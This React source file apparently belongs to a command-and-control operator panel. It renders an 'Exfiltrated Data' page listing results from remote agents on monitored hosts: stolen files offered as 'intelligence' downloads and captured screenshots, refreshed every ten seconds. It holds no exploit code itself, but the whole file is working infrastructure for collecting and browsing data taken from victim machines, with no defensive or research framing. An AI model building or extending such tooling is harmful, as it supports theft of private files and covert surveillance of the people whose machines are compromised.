import React, { useEffect, useState } from 'react';
import { 
  Database, 
  Search, 
  Download, 
  ExternalLink, 
  RefreshCw, 
  Monitor,
  Terminal,
  ChevronDown,
  ChevronUp,
  FileText,
  AlertCircle
} from 'lucide-react';
import { tasksApi } from '../utils/api';
import { formatDistanceToNow } from 'date-fns';
import { Link } from 'react-router-dom';

const ResultRow = ({ result }) => {
  const [expanded, setExpanded] = useState(false);

  const renderContent = () => {
    const output = result.output;
    if (!output) return <div className="p-4 text-slate-500 italic text-xs">No output returned from agent</div>;

    if (output.startsWith('FILE_EXFILTRATED:')) {
      const fullPath = output.replace('FILE_EXFILTRATED:', '');
      const filename = fullPath.split(/[\\/]/).pop().split('_').slice(1).join('_');
      const downloadUrl = `${window.location.origin}/exfiltrated/${result.agent_id}/${fullPath.split(/[\\/]/).pop()}`;
      
      return (
        <div className="p-6 m-4 rounded-2xl bg-primary/10 border border-primary/20 flex items-center justify-between group shadow-xl">
          <div className="flex items-center gap-5">
            <div className="p-4 bg-primary/20 rounded-2xl text-primary group-hover:rotate-12 transition-transform">
              <Download className="w-8 h-8" />
            </div>
            <div>
              <div className="text-xs font-black text-primary uppercase tracking-[0.2em] mb-1 opacity-70">Binary Intelligence</div>
              <div className="text-base font-bold text-white">{filename}</div>
              <div className="text-[10px] text-slate-500 font-mono mt-1">{fullPath}</div>
            </div>
          </div>
          <button 
            onClick={() => window.open(downloadUrl)}
            className="px-8 py-3 rounded-xl bg-primary text-white text-[11px] font-black uppercase tracking-[0.2em] hover:bg-primary-hover transition-all shadow-lg shadow-primary/30 flex items-center gap-3"
          >
            <Download className="w-4 h-4" /> Download Intelligence
          </button>
        </div>
      );
    }

    if (output.startsWith('SCREENSHOT:')) {
      const dataUri = output.replace('SCREENSHOT:', '');
      return (
        <div className="p-4 flex flex-col items-center">
          <img src={dataUri} alt="Exfiltrated Screenshot" className="rounded-xl border border-slate-800 shadow-2xl max-w-full hover:scale-[1.02] transition-transform cursor-zoom-in" onClick={() => window.open(dataUri)} />
        </div>
      );
    }

    try {
      const parsed = JSON.parse(output);
      return (
        <pre className="result-output">
          {JSON.stringify(parsed, null, 2)}
        </pre>
      );
    } catch {
      return (
        <pre className="result-output">
          {output}
        </pre>
      );
    }
  };

  return (
    <div className={`result-row ${expanded ? 'expanded' : ''}`}>
      <div className="result-row-header" onClick={() => setExpanded(!expanded)}>
        <div className="result-agent">
          <Monitor className="w-3.5 h-3.5 text-slate-400" />
          <span className="font-medium">{result.agent_hostname || result.agent_id.substring(0, 8)}</span>
        </div>
        <div className="result-task">
          <Terminal className="w-3.5 h-3.5 text-primary" />
          <span className="type-badge">{result.task_type}</span>
        </div>
        <div className="result-time text-slate-500 text-xs">
          {formatDistanceToNow(new Date(result.created_at), { addSuffix: true })}
        </div>
        <div className="result-status">
          <span className={`status-pill ${result.status === 'success' ? 'online' : 'offline'}`}>
            {result.status}
          </span>
        </div>
        <div className="result-toggle">
          {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
        </div>
      </div>
      
      {expanded && (
        <div className="result-content animate-in fade-in slide-in-from-top-2 duration-200">
          <div className="result-meta">
            <div className="meta-item">
              <span className="meta-label">Task ID:</span>
              <span className="meta-value font-mono">{result.task_id}</span>
            </div>
            <div className="meta-item">
              <span className="meta-label">Agent ID:</span>
              <span className="meta-value font-mono">{result.agent_id}</span>
            </div>
            <div className="meta-item flex-1 text-right">
              <Link to={`/agents/${result.agent_id}`} className="text-xs text-primary hover:underline flex items-center justify-end gap-1">
                View Agent <ExternalLink className="w-3 h-3" />
              </Link>
            </div>
          </div>
          <div className="result-output-container">
            <div className="output-header">
              <FileText className="w-3.5 h-3.5" />
              <span>Standard Output</span>
              <button className="ml-auto text-xs text-slate-400 hover:text-white flex items-center gap-1">
                <Download className="w-3 h-3" /> Download
              </button>
            </div>
            {renderContent()}
            {result.error && (
              <div className="result-error mt-4">
                <div className="output-header text-red-400">
                  <AlertCircle className="w-3.5 h-3.5" />
                  <span>Error Details</span>
                </div>
                <pre className="error-output">
                  {result.error}
                </pre>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

const DataPage = () => {
  const [results, setResults] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState('');

  const fetchResults = async () => {
    try {
      const data = await tasksApi.resultsAll();
      setResults(data.results || []);
    } catch (err) {
      console.error('Failed to fetch results:', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const init = async () => {
      await fetchResults();
    };
    init();
    const interval = setInterval(fetchResults, 10000);
    return () => clearInterval(interval);
  }, []);

  const filteredResults = results.filter(res => 
    res.task_type?.toLowerCase().includes(searchQuery.toLowerCase()) ||
    res.agent_hostname?.toLowerCase().includes(searchQuery.toLowerCase()) ||
    res.output?.toLowerCase().includes(searchQuery.toLowerCase()) ||
    res.agent_id.toLowerCase().includes(searchQuery.toLowerCase())
  );

  return (
    <div className="dashboard scroll-area">
      <header className="dash-header">
        <div>
          <h1 className="dash-title">Exfiltrated Data</h1>
          <p className="dash-subtitle">Central repository for all intelligence gathered from nodes</p>
        </div>
        <div className="dash-header-actions">
          <div className="dash-search">
            <Search className="dash-search-icon" />
            <input
              type="text"
              placeholder="Search data, host, or type..."
              value={searchQuery}
              onChange={e => setSearchQuery(e.target.value)}
              className="dash-search-input"
            />
          </div>
          <button 
            className="dash-notif-btn ml-2" 
            onClick={() => { setLoading(true); fetchResults(); }}
            title="Refresh"
          >
            <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
          </button>
        </div>
      </header>

      <section className="results-container mt-6">
        {loading && results.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-20 text-slate-500">
            <RefreshCw className="w-8 h-8 animate-spin mb-4" />
            <p>Gathering intelligence...</p>
          </div>
        ) : filteredResults.length === 0 ? (
          <div className="dash-empty">
            <Database className="w-12 h-12 text-slate-700 mb-4" />
            <p>No intelligence records found</p>
          </div>
        ) : (
          <div className="results-list">
            {filteredResults.map(result => (
              <ResultRow key={result.id} result={result} />
            ))}
          </div>
        )}
      </section>
    </div>
  );
};

export default DataPage;
